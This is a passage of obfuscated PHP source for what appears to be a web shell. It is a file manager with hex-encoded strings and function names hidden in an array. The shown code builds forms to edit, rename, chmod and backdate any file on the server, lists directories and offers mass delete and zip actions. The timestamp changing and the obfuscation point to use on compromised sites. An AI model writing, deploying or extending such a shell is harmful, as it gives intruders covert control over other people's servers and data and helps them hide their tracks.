            echo '<h3>Editing: '.$f[28]($f[5]($_GET["\x74\x61\x72\x67\x65\x74\x5f\x66\x69\x6c\x65"])).'</h3><form method="POST" action="?option=true&path='.$f[38]($path).'"><textarea name="src_content" style="width:100%;height:400px;">'.$f[28](@$f[50]($_GET["\x74\x61\x72\x67\x65\x74\x5f\x66\x69\x6c\x65"])).'</textarea><br><input type="hidden" name="path_target" value="'.$f[28]($_GET["\x74\x61\x72\x67\x65\x74\x5f\x66\x69\x6c\x65"]).'"><input type="hidden" name="opt_action" value="edit_save"><input type="submit" value="SAVE" style="margin-top:10px;"/></form>';
            break;
        case "\x72\x65\x6e\x61\x6d\x65\x5f\x66\x6f\x72\x6d":
            echo '<h3>Rename: '.$f[28]($f[5]($_GET["\x74\x61\x72\x67\x65\x74\x5f\x66\x69\x6c\x65"])).'</h3><form method="POST" action="?option=true&path='.$f[38]($path).'">New Name: <input name="new_name_value" type="text" value="'.$f[28]($f[5]($_GET["\x74\x61\x72\x67\x65\x74\x5f\x66\x69\x6c\x65"])).'"/><input type="hidden" name="path_target" value="'.$f[28]($_GET["\x74\x61\x72\x67\x65\x74\x5f\x66\x69\x6c\x65"]).'"><input type="hidden" name="opt_action" value="rename_save"><input type="submit" value="RENAME"/></form>';
            break;
        case "\x63\x68\x6d\x6f\x64\x5f\x66\x6f\x72\x6d":
            $current_perms = getNumericPerms($_GET["\x74\x61\x72\x67\x65\x74\x5f\x66\x69\x6c\x65"]);
            echo '<h3>Chmod: '.$f[28]($f[5]($_GET["\x74\x61\x72\x67\x65\x74\x5f\x66\x69\x6c\x65"])).'</h3><form method="POST" action="?option=true&path='.$f[38]($path).'">Permission: <input name="perm_value" type="text" size="4" value="'.$current_perms.'" placeholder="0755"/><input type="hidden" name="path_target" value="'.$f[28]($_GET["\x74\x61\x72\x67\x65\x74\x5f\x66\x69\x6c\x65"]).'"><input type="hidden" name="opt_action" value="chmod_save"><input type="submit" value="CHMOD"/></form>';
            break;
        case "\x63\x68\x64\x61\x74\x65\x5f\x66\x6f\x72\x6d":
            $current_date = $f[31]("\x59\x2d\x6d\x2d\x64\x20\x48\x3a\x69\x3a\x73", $f[52]($_GET["\x74\x61\x72\x67\x65\x74\x5f\x66\x69\x6c\x65"]));
            echo '<h3>Change Date: '.$f[28]($f[5]($_GET["\x74\x61\x72\x67\x65\x74\x5f\x66\x69\x6c\x65"])).'</h3><form method="POST" action="?option=true&path='.$f[38]($path).'">New Date: <input name="new_date_value" type="text" value="'.$current_date.'" placeholder="YYYY-MM-DD HH:MM:SS" style="width:250px;"/><input type="hidden" name="path_target" value="'.$f[28]($_GET["\x74\x61\x72\x67\x65\x74\x5f\x66\x69\x6c\x65"]).'"><input type="hidden" name="opt_action" value="chdate_save"><input type="submit" value="CHANGE"/></form>';
            break;
    }
    echo '</div>';
}

if ($show_file_list) {
    echo '<form method="POST" action="?path='.$f[38]($path).'">';
    echo '<div id="content"><table><tr class="first">';
    echo '<th><input type="checkbox" onclick="document.querySelectorAll(\'.file-checkbox\').forEach(e=>e.checked=this.checked);"></th>';
    echo '<th>Name</th><th>Size</th><th>Perm</th><th>Owner</th><th>Last Modified</th><th>Options</th></tr>';
    $scandir_items = @$f[19]($path);
    if ($scandir_items) {
        $f[47]($scandir_items, function($a, $b) use ($path, $f) {
            if ($a == "\x2e\x2e") return -1; if ($b == "\x2e\x2e") return 1;
            if ($f[17]($path."\x2f".$a) && !$f[17]($path."\x2f".$b)) return -1;
            if (!$f[17]($path."\x2f".$a) && $f[17]($path."\x2f".$b)) return 1;
            return $f[48]($a, $b);
        });
        foreach($scandir_items as $item){
            if($item == "\x2e") continue;
            $full_item_path = $path.DIRECTORY_SEPARATOR.$item;
            $encoded_full_item_path = $f[38]($full_item_path);
            
            $is_dir = $f[17]($full_item_path);
            $is_file = $f[43]($full_item_path);
            $file_size = $is_dir ? "\x2d\x2d" : formatSizeDisplay(@$f[45]($full_item_path));
            $file_perms = getNumericPerms($full_item_path);
            $file_mtime = $is_dir ? "\x2d\x2d" : $f[31]("\x59\x2d\x6d\x2d\x64\x20\x48\x3a\x69", $f[52]($full_item_path));
            $perm_color = ($f[26]($full_item_path) ? "\x23\x30\x30\x66\x66\x30\x30" : (!$f[46]($full_item_path) ? "\x23\x46\x46\x30\x30\x30\x30" : "\x23\x66\x66\x66\x66\x66\x66"));
            echo "<tr><td class='td_home' style='text-align:center;'>";
            if ($item != "\x2e\x2e") echo "<input type='checkbox' class='file-checkbox' name='selected_files[]' value='".$f[28]($full_item_path)."'>";
            echo "</td><td class='td_home'>";
            if($item == "\x2e\x2e") echo "<i class='fa fa-folder-open-o'></i> <a href=\"?path=".$f[38]($f[32]($path))."\">".$f[28]($item)."</a>";
            elseif($is_dir) echo "<i class='fa fa-folder-o'></i> <a href=\"?path=$encoded_full_item_path\">".$f[28]($item)."</a>";
            else echo "<i class='fa fa-file-o'></i> <a href=\"?action=view_file&target_file=$encoded_full_item_path&path=".$f[38]($path)."\">".$f[28]($item)."</a>";
            echo "<td class='td_home' style='text-align:center;color:#fff;'>".$file_size."</td>";
            echo "<td class='td_home' style='text-align:center;'><font color='".$perm_color."'>".$file_perms."</font></td>";
            echo "<td class='td_home' style='text-align:center;color:#fff;'>".getOwner($full_item_path)."</td>";
            echo "<td class='td_home' style='text-align:center;color:#fff;'>".$file_mtime."</td>";
            echo "<td class='td_home' style='text-align:center;'><select style='width:100px;background:#000;color:#FFD700;border:1px solid #FFD700;' onchange=\"if(this.value) window.location.href='?action='+this.value+'&target_file={$encoded_full_item_path}&path=".$f[38]($path)."'\"><option value=''>Action</option><option value='delete'>Delete</option>";
            if($is_file) {
                echo "<option value='edit_form'>Edit</option>";
                if($f[30]("\x5a\x69\x70\x41\x72\x63\x68\x69\x76\x65") && $f[49]($full_item_path, PATHINFO_EXTENSION) == "\x7a\x69\x70") echo "<option value='extract_form'>Extract</option>";
            }
            echo "<option value='rename_form'>Rename</option><option value='chmod_form'>Chmod</option>";
            if($is_file) echo "<option value='chdate_form'>ChDate</option>";
            echo "</select></td></tr>";
        }
    } else { echo "<tr><td colspan='7' style='text-align:center;'><font color='red'>Gagal membaca direktori.</font></td></tr>"; }
    if ($f[30]("\x5a\x69\x70\x41\x72\x63\x68\x69\x76\x65")) {
        echo '<tfoot><tr class="first"><td colspan="7" style="padding:10px;">With selected: <select name="bulk_action" style="background:#000;color:#FFD700;border:1px solid #FFD700;"><option value="">Choose...</option><option value="zip_selected">Zip</option><option value="delete_selected">Mass Delete</option></select> <input type="submit" value="Go"></td></tr></tfoot>';
    }
    echo '</table></div></form>';
}
?>
<hr style="border-top: 1px solid #FFD700; width: 95%; max-width: 1400px; margin: 15px auto;">
<center><font color="#fff" size="2px"><b><?="\x43\x6f\x64\x65\x64\x20\x57\x69\x74\x68\x20\xe2\x9d\xa4\x20\x62\x79\x20"?><font color="#FFD700"><?=$f[28]($author)?></font></b></center>
</body>
</html>
